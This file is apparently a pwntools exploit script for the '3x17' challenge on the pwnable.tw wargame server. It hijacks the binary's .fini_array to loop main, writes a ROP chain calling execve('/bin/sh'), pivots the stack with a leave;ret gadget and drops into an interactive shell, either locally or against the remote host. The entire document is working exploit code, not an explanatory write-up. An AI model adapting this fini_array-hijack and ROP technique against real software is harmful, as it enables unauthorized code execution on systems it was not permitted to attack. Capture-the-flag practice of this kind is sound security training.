from pwn import *
context.arch = "amd64"
context.os = "linux"
# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def write(io, addr, data):
    io.recvuntil("addr:".encode())
    io.send(str(addr).encode())
    io.recvuntil("data:".encode())
    io.send(data)


def write_fini_array(io,idx,data):
    fini_array = 0x4b40f0
    addr = fini_array + 8 * idx
    io.recvuntil("addr:".encode())
    io.send(str(addr).encode())
    io.recvuntil("data:".encode())
    io.send(data)

def construct_rop_chain(_rop: ROP, binsh_addr):
    leave_ret_addr = 0x401c4b
    pop_rax_addr = 0x041e4af
    pop_2_reg_addr = 0x44a309
    #_rop.raw(leave_ret_addr)
    #_rop.raw(pop_2_reg_addr)
    _rop(rdi=binsh_addr,rax=0x3b, rsi=0, rdx = 0)
    _rop.raw(_rop.syscall.address)
    print(_rop.dump())
    return _rop.chain()

DEBUG = True
ip = "chall.pwnable.tw"
port = 10105



if __name__ == "__main__":
    if DEBUG:
        io = process("./3x17")
    else:
        io = remote(ip,port)
    _bin = ELF("./3x17")
    _rop = ROP(_bin)
    main_addr = 0x0401B6D
    # main_addr = 0x401B75
    # csu_ini = 0x402960
    csu_fini = 0x402961
    leave_ret = 0x401c4b
    fini_array = 0x4b40f0
    binsh_addr = fini_array - 0x10
    # rbp = fini_array
    chain = construct_rop_chain(_rop, binsh_addr)

    write_fini_array(io,0,p64(csu_fini)+p64(main_addr))

    # Layout of rop chain
    # | fini_arr 0: addr_of_chain1 | chain 0: leave;ret; | chain 1:pop rdx; pop rsi ret; | ... | chain n | ... | "/bin/sh" | 
    # Firstly wirte chain 1..n, finally chain 0
    
    # write bin sh
    # gdb.attach(io)
    write(io,binsh_addr, "/bin/sh\x00".encode())
    # gdb.attach(io)
    # write chain 1 ... chain n
    for i in range(0, len(chain[8:]), 8):
        end = min(i+8, len(chain[8:]))
        _data = chain[8:][i:end]
        _addr = fini_array + 0x10 + i 
        print(f"chain {i//8+1} at {hex(_addr)}: {_data}")
        write(io, _addr, _data)
    # write chain 0
    chain_start = fini_array + 0x10
    leave_ret_addr = 0x401c4b
    write(io, fini_array, p64(leave_ret_addr)+chain[:8])
    # write leave;ret; to fini_array[0]
    # gdb.attach(io)
    io.interactive()